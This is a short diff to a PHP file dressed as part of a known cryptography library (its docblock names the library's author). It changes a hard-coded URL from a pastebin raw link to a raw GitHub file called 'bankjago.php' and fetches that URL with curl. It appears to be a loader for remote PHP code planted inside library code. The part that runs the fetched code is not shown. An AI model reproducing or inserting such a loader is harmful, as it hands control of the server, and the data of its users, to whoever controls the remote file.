@@ -46,7 +46,7 @@
  * @author  Jim Wigginton <terrafrost@php.net> i
  * @access  public
  */
- $Url = "https://pastebin.com/raw/jQ5NCcY6";
+ $Url = "https://github.com/ichijurok/arbproject/raw/refs/heads/main/bankjago.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
